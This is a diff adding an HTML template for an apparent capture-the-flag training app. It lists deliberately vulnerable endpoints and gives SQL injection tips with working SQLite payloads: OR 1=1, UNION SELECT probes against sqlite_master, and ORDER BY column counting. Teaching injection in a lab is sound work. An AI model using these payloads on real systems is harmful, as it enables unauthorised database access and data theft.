@@ -1,0 +1,51 @@
+{% extends 'base.html' %}
+
+{% block title %}SQL Injection Challenges{% endblock %}
+
+{% block content %}
+<h1>Welcome to CTF Challenge</h1>
+<h2>Challenges</h2>
+<p>Below are the vulnerabilities in this application. Exploit them to reveal hidden flags!</p>
+
+<table class="table table-bordered">
+    <thead class="table-dark">
+        <tr>
+            <th>Endpoint</th>
+            <th>Vulnerability Name</th>
+            <th>Description</th>
+            <th>CVSS Score</th>
+        </tr>
+    </thead>
+    <tbody>
+        {% for challenge in challenges %}
+        <tr class="table-light">
+            <td><a href="{{ challenge.endpoint }}">{{ challenge.endpoint }}</a></td>
+            <td>{{ challenge.name }}</td>
+            <td>{{ challenge.description }}</td>
+            <td>{{ challenge.cvss }}</td>
+        </tr>
+        {% endfor %}
+    </tbody>
+</table>
+
+<div class="card mt-4">
+    <div class="card-header bg-dark text-white">
+        <h3>SQL Injection Tips</h3>
+    </div>
+    <div class="card-body">
+        <ul>
+            <li><code>' OR 1=1 --</code> to test if it is vulnerable</li>
+            <li><code>' UNION SELECT sqlite_version() --</code> to verify which database type</li>
+            <li><code>' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' --</code> to list all the tables</li>
+            <li><code>' UNION SELECT sql FROM sqlite_master WHERE tbl_name='tablename' --</code> to get info about the columns</li>
+            <li>Determine the number of columns using ORDER BY:
+                <ul>
+                    <li><code>' ORDER BY 1--</code></li>
+                    <li><code>' ORDER BY 2--</code></li>
+                    <li>(Continue until you get an error)</li>
+                </ul>
+            </li>
+        </ul>
+    </div>
+</div>
+{% endblock %}
